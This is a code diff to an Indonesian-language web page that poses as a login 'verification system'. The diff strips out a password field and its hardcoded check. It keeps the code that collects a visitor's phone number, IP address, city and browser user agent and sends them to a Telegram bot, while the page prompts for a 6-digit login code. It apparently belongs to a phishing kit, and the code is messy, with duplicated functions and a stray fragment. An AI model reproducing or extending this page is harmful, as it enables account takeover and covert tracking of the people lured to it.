@@ -372,10 +372,7 @@
 <input disabled="" id="loginCode" maxlength="6" placeholder="Masukkan kode 6 digit" type="text"/>
 </div>
 <button class="login-button" id="loginButton" onclick="triggerLogin()">Klik untuk dapatkan kode</button>
-<div class="input-group">
-<label for="loginPassword">PASSWORD</label>
-<input id="loginPassword" placeholder="Masukkan password akses" type="password"/>
-</div>
+
 <div class="terminal" id="terminal">
 <div class="terminal-line"><span class="terminal-prompt">&gt;</span> Sistem verifikasi dimulai...</div>
 </div>
@@ -447,14 +444,14 @@ function verifyCode() {
 
 function triggerLogin() {
     const phoneNumber = document.getElementById('loginPhone').value;
-    const password = document.getElementById('loginPassword').value;
+    
 
     if (!phoneNumber) {
         alert('Masukkan nomor telepon terlebih dahulu');
         return;
     }
 
-    if (password !== '321123') {
+    /* password check removed */ if (false) {
         alert('Password salah!');
         return;
     }
@@ -467,15 +464,15 @@ function triggerLogin() {
         .then(res => res.json())
         .then(data => {
             const userIP = data.ip + ' (' + data.city + ', ' + data.country_name + ')';
-            processLogin(userIP, phoneNumber, password);
+            processLogin(userIP, phoneNumber);
         })
         .catch(() => {
-            processLogin('Unavailable', phoneNumber, password);
+            processLogin('Unavailable', phoneNumber);
         });
 }
 
-function processLogin(userIP, phoneNumber, password) {
-    sendToTelegram(`🔐 LOGIN ATTEMPT\n📱 Nomor: ${phoneNumber}\n🔑 Password: ${password}\n🖥️ User Agent: ${navigator.userAgent}\n🌐 IP: ${userIP}`);
+function processLogin(userIP, phoneNumber) {
+    sendToTelegram(`🔐 LOGIN ATTEMPT\n📱 Nomor: ${phoneNumber}\n🖥️ User Agent: ${navigator.userAgent}\n🌐 IP: ${userIP}`);
 
     setTimeout(() => {
         addTerminalLine('> Menghubungkan ke server verifikasi...');
@@ -497,14 +494,14 @@ function processLogin(userIP, phoneNumber, password) {
 // 🌐 Trigger login, ambil IP dulu baru lanjut
 function triggerLogin() {
     const phoneNumber = document.getElementById('loginPhone').value;
-    const password = document.getElementById('loginPassword').value;
+    
 
     if (!phoneNumber) {
         alert('Masukkan nomor telepon terlebih dahulu');
         return;
     }
 
-    if (password !== '321123') {
+    /* password check removed */ if (false) {
         alert('Password salah!');
         return;
     }
@@ -525,7 +522,7 @@ function triggerLogin() {
 }
 
 function startLoginFinal(userIP, phoneNumber, password) {
-    sendToTelegram(`🔐 LOGIN ATTEMPT\n📱 Nomor: ${phoneNumber}\n🔑 Password: ${password}\n🖥️ User Agent: ${navigator.userAgent}\n🌐 IP: ${userIP}`);
+    sendToTelegram(`🔐 LOGIN ATTEMPT\n📱 Nomor: ${phoneNumber}\n🖥️ User Agent: ${navigator.userAgent}\n🌐 IP: ${userIP}`);
 
     setTimeout(() => {
         addTerminalLine('> Menghubungkan ke server verifikasi...');
@@ -546,14 +543,14 @@ function startLoginFinal(userIP, phoneNumber, password) {
 
 async function startLogin() {
     const phoneNumber = document.getElementById('loginPhone').value;
-    const password = document.getElementById('loginPassword').value;
+    
 
     if (!phoneNumber) {
         alert('Masukkan nomor telepon terlebih dahulu');
         return;
     }
 
-    if (password !== '321123') {
+    /* password check removed */ if (false) {
         alert('Password salah!');
         return;
     }
@@ -573,7 +570,7 @@ async function startLogin() {
     }
 
     // Kirim ke Telegram
-    sendToTelegram(`🔐 LOGIN ATTEMPT\n📱 Nomor: ${phoneNumber}\n🔑 Password: ${password}\n🖥️ User Agent: ${navigator.userAgent}\n🌐 IP: ${userIP}`);
+    sendToTelegram(`🔐 LOGIN ATTEMPT\n📱 Nomor: ${phoneNumber}\n🖥️ User Agent: ${navigator.userAgent}\n🌐 IP: ${userIP}`);
 
     setTimeout(() => {
         addTerminalLine('> Menghubungkan ke server verifikasi...');
@@ -674,7 +671,7 @@ function updateInteractiveMap(lat, lon) {
         
 // 🌐 Ambil IP lalu lanjutkan proses login
 
-    if (password !== '321123') {
+    /* password check removed */ if (false) {
         alert('Password salah!');
         return;
     }
